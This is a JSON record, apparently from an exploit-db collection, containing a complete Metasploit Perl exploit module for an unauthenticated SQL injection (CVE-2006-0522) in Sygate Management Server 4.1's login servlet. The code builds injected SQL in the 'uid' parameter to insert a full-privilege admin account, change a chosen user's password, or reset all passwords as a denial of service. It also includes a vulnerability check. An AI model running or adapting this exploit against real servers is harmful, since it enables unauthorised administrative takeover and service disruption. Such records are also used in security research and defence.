{
  "id": "1680",
  "title": "Symantec Sygate Management Server - &#039;LOGIN&#039; SQL Injection (Metasploit)",
  "cve": "CVE-2006-0522",
  "vuln_type": "sqli",
  "code": "##\r\n# This file is part of the Metasploit Framework and may be redistributed\r\n# according to the licenses defined in the Authors field below. In the\r\n# case of an unknown or missing license, this file defaults to the same\r\n# license as the core Framework (dual GPLv2 and Artistic). The latest\r\n# version of the Framework can always be obtained from metasploit.com.\r\n##\r\n\r\n##\r\n# \r\n# Affected product : Sygate Management Server v4.1 (at least)\r\n#\r\n# Vulnerability    : SQL-Injection in login page\r\n# Required privs   : Network access to the admin interface (HTTP)\r\n# Impact           : Raw access to the database\r\n# Sample payload   : Create a valid admin account directly in the database  \r\n#\r\n# Editor status    : Official patch available\r\n# http://securityresponse.symantec.com/avcenter/security/Content/2006.02.01.html\r\n#\r\n##\r\n\r\npackage Msf::Exploit::sygate_policy_manager;\r\nuse base \"Msf::Exploit\";\r\nuse strict;\r\nuse Pex::Text;\r\nuse bytes;\r\nuse vars qw{$HAS_SHA1};\r\n\r\nBEGIN \r\n{\r\n\t$HAS_SHA1 = 0;\r\n\t\r\n\tif (eval('require Digest::SHA1')) {\r\n\t\teval('use Digest::SHA1 qw(sha1);');\r\n\t\t$HAS_SHA1 = 1;\r\n\t}\t\r\n}\r\n\r\nmy $advanced = { };\r\n\r\nmy $info = {\r\n\t'Name'     => 'Sygate Management Server SQL Injection',\r\n\t'Version'  => '$Revision: 1.3 $',\r\n\t'Authors'  => [ 'Nicob <nicob[at]nicob.net>' ],\r\n\t'Arch'     => [ 'x86' ],\r\n\t'OS'       => [ 'win32' ],\r\n\t'Priv'     => 0,\r\n\t'UserOpts' =>\r\n\t  {\r\n\t\t'RHOST'    => [1, 'ADDR',   'The target address'],\r\n\t\t'RPORT'    => [1, 'PORT',   'The target port', 80],\r\n\t\t'VHOST'    => [0, 'DATA',   'The virtual host name of the server'],\r\n\t\t'LOGIN'    => [0, 'LOGIN',  'The username to create/modify', 'reporting'],\r\n\t\t'PASSWD'   => [0, 'PASSWD', 'The encrypted password of this user', 'my_passwd'],\r\n\t\t'SERVLET'  => [1, 'DATA',   'Full path of the servlet', '/servlet/Sygate.Servlet.login'],\r\n\t\t'SSL'      => [0, 'BOOL',   'Use SSL'],\r\n\t  },\r\n\r\n\t'Description' => Pex::Text::Freeform(qq{\r\n\t\tThis module exploits a non authenticated SQL-Injection vulnerability in the\r\n\t\tSygate Management Server (now Symantec Policy Manager), in order to create a new\r\n\t\tadmin account or change the password of an existing one. Version 4.1 is known to be vulnerable.\r\n\t\tVersion 5 is not vulnerable.\r\n}),\r\n\r\n\t'Refs' =>\r\n\t  [\r\n\t\t['URL',   'http://securityresponse.symantec.com/avcenter/security/Content/2006.02.01.html'],\r\n\t\t['CVE',   '2006-0522'],\r\n\t\t['OSVDB', '22883'],\r\n\t\t['BID',   '16452'],\r\n\t  ],\r\n\r\n\t'Targets' => \r\n\t\t[\r\n\t\t\t['Change a specific users password', 'change_user_passwd'],\r\n\t\t\t['Create a new administrative account', 'add_account'],\r\n\t\t\t['Reset all passwords (denial of service)', 'reset_all'],\r\n\t\t],\r\n\t\r\n\t'DefaultTarget' => 0,\r\n\t\r\n\t'Keys' => ['sygate'],\r\n\r\n  };\r\n\r\nsub new {\r\n\tmy $class = shift;\r\n\tmy $self = $class->SUPER::new({'Info' => $info, 'Advanced' => $advanced}, @_);\r\n\treturn($self);\r\n}\r\n\r\nsub Check {\r\n\tmy $self = shift;\r\n\tmy $target_host    = $self->GetVar('RHOST');\r\n\tmy $vhost          = $self->VHost;\r\n\tmy $target_port    = $self->GetVar('RPORT');\r\n\tmy $servlet        = $self->GetVar('SERVLET');\r\n\t\r\n\tmy $request =\r\n\t  \"GET $servlet?uid=test1&up=test2 HTTP/1.1\\r\\n\".\r\n\t  \"Accept: */*\\r\\n\".\r\n\t  \"User-Agent: Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1)\\r\\n\".\r\n\t  \"Host: $vhost:$target_port\\r\\n\".\r\n\t  \"Connection: Close\\r\\n\".\r\n\t  \"\\r\\n\";\r\n\r\n\tmy $s = Msf::Socket::Tcp->new(\r\n\t\t'PeerAddr' => $target_host,\r\n\t\t'PeerPort' => $target_port,\r\n\t\t'SSL'      => $self->GetVar('SSL'),\r\n\t  );\r\n\r\n\tif ($s->IsError){\r\n\t\t$self->PrintLine('[*] Error creating socket: ' . $s->GetError);\r\n\t\treturn $self->CheckCode('Connect');\r\n\t}\r\n\r\n\t$self->PrintLine(\"[*] Establishing a connection to the target...\");\r\n\r\n\t$s->Send($request);\r\n\tmy $results = $s->Recv(-1, 20);\r\n\t$s->Close();\r\n\t\r\n\tif ($results =~ /HTTP\\/1\\..\\s+200/) {\r\n\r\n\t\t$self->PrintLine(\"[*] Vulnerable server detected!\");\r\n\t\treturn $self->CheckCode('Confirmed');\r\n\t\t\r\n\t} elsif ($results =~ /HTTP\\/1\\..\\s+([345]\\d+)/) {\r\n\r\n\t\t$self->PrintLine(\"[*] The Sygate Policy Manager servlet was not found.\");\r\n\t\treturn $self->CheckCode('Safe');\r\n\t}\r\n\r\n\t$self->PrintLine(\"[*] Generic error...\");\r\n\treturn $self->CheckCode('Generic');\r\n}\r\n\r\nsub Exploit {\r\n\tmy $self = shift;\r\n\tmy $target_host    = $self->GetVar('RHOST');\r\n\tmy $vhost          = $self->VHost;\r\n\tmy $target_port    = $self->GetVar('RPORT');\r\n\tmy $servlet        = $self->GetVar('SERVLET');\r\n\tmy $login          = $self->GetVar('LOGIN');\r\n\tmy $passwd         = $self->GetVar('PASSWD');\r\n\tmy $target         = $self->Targets->[$self->GetVar('TARGET')];\r\n\t\r\n\tif (! $HAS_SHA1) {\r\n\t\t$self->PrintLine(\"[*] Please install the Digest-SHA1 module to use this exploit\");\r\n\t\treturn;\r\n\t}\r\n\r\n\t# The 'Password' field is a hex-encoded SHA-1 digest of the \"user+password\" string\r\n\tmy $sha1 = sha1($login.$passwd);\r\n\t$sha1 =~ s/./sprintf(\"%02x\", ord($&))/ges;\r\n\t$sha1 = \"0x\".uc($sha1);\r\n\r\n\t# Maximum level of privileges\r\n\tmy $privs = \"255\";\r\n\r\n\t\r\n\tmy %sqlpayloads = \r\n\t(\r\n\t\t# Create a new valid admin account (in SMS v4.1) -- [BUG] : Can't access the Users panel :-(\r\n\t\t'add_account' => \r\n\t\t\t\"insert into CMS35.Admin (RecUpdateTime,LoginName,AdminNickName,Password,AdminRights,\".\r\n\t\t\t\"AdminEmail,FailedLogin,AlertOnFailure,AlertFailureThreshold,OnlineState) \".\r\n\t\t\t\"values (getutcdate(),'$login','$login',$sha1,'$privs','',0,0,0,0)\",\r\n\r\n\t\t# Reset the password of every account to \"0x4141\" (in SMS v4.1) -- Denial of Service only !\r\n\t\t'reset_all' =>\r\n\t\t\t\"update CMS35.Admin set Password=cast('AA' as varbinary)\",\r\n\t\r\n\t\t# Change the password of the selected account (in SMS v4.1) -- Yeah, full access to 'admin' !\r\n\t\t'change_user_passwd' =>\r\n\t\t\t\"update CMS35.Admin set Password=$sha1 where LoginName='$login'\",\r\n\t);\r\n\t\r\n\tmy $payload = $sqlpayloads{ $target->[1] };\r\n\r\n\t# Inject our payload\r\n\t$servlet = $servlet.\"?uid=\".$self->URLEncode(\"';$payload -- \").\"&up=foo\";\r\n\r\n\tmy $request =\r\n\t  \"GET $servlet HTTP/1.1\\r\\n\".\r\n\t  \"Accept: */*\\r\\n\".\r\n\t  \"User-Agent: Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1)\\r\\n\".\r\n\t  \"Host: $vhost:$target_port\\r\\n\".\r\n\t  \"Connection: Close\\r\\n\".\r\n\t  \"\\r\\n\";\r\n\r\n\tmy $s = Msf::Socket::Tcp->new(\r\n\t\t'PeerAddr' => $target_host,\r\n\t\t'PeerPort' => $target_port,\r\n\t\t'SSL'      => $self->GetVar('SSL'),\r\n\t  );\r\n\r\n\tif ($s->IsError){\r\n\t\t$self->PrintLine('[*] Error creating socket: ' . $s->GetError);\r\n\t\treturn;\r\n\t}\r\n\r\n\t$self->PrintLine(\"[*] Establishing a connection to the target...\");\r\n\t$self->PrintLine(' ');\r\n\t$s->Send($request);\r\n\tmy $results = $s->Recv(-1, 20);\r\n\t\r\n\tif ($results =~ /HTTP\\/1\\.. 200 OK/im) {\r\n\t\t# Seems to be fine ;-)\r\n\t\t$self->PrintLine(\"OK. Now try to log with user '$login' and passwd '$passwd'\");\r\n\t} else {\r\n\t\t$self->PrintLine(\"Doh ! Are you sure this server is vulnerable ?\");\r\n\t}\r\n\r\n\t$s->Close();\r\n\treturn;\r\n}\r\n\r\nsub URLEncode {\r\n\tmy $self = shift;\r\n\tmy $data = shift;\r\n\tmy $res;\r\n\r\n\tforeach my $c (unpack('C*', $data)) {\r\n\t\tif (\r\n\t\t\t($c >= 0x30 && $c <= 0x39) ||\r\n\t\t\t($c >= 0x41 && $c <= 0x5A) ||\r\n\t\t\t($c >= 0x61 && $c <= 0x7A)\r\n\t\t  ) {\r\n\t\t\t$res .= chr($c);\r\n\t\t} else {\r\n\t\t\t$res .= sprintf(\"%%%.2x\", $c);\r\n\t\t}\r\n\t}\r\n\treturn $res;\r\n}\r\n\r\nsub VHost {\r\n\tmy $self = shift;\r\n\tmy $name = $self->GetVar('VHOST') || $self->GetVar('RHOST');\r\n\treturn $name;\r\n}\r\n\r\n1;\r\n\r\n# milw0rm.com [2006-04-15]",
  "url": "https://www.exploit-db.com/exploits/1680"
}